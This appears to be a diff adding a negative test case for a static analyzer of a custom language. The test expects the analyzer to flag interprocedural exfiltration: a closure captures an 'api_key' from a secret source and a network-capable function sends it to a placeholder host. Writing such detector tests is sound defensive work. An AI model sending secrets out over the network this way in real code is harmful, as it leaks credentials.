@@ -1,0 +1,7 @@
+// EXPECT: FAIL
+// ERROR_CONTAINS: ANUBIS_INTERPROC_EXFILTRATION
+// run(mk(k)) where mk returns a closure over its OWN param (`fn mk(p){ return |x| p; }`). resolve_closure_arg
+// now beta-substitutes mk's param p by the arg k, yielding the body `k`.
+fn mk(p) { return |x| p; }
+fn run(cb) uses(net.send) { send("host", 80, cb(0)); }
+fn main() uses(net.send) { let k = secret_source("api_key"); run(mk(k)); }
